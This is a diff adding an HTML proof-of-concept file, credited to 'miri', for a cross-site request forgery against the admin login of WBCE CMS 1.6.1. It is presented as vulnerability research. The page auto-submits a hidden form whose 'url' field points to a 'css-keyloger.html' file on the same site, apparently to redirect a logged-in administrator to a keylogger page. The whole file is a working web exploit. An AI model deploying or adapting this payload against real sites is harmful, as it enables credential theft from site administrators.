@@ -1,0 +1,14 @@
+<html>
+  <title>
+    This CSRF was found by miri
+  </title>
+  <body>
+    <h1>
+      CSRF POC
+    </h1>
+    <form action="http://localhost/WBCE_CMS-1.6.1/wbce/admin/login/index.php" method="POST" enctype="application/x-www-form-urlencoded">
+      <input type="hidden" name="url" value="http://localhost/WBCE_CMS-1.6.1/wbce/media/css-keyloger.html" />
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
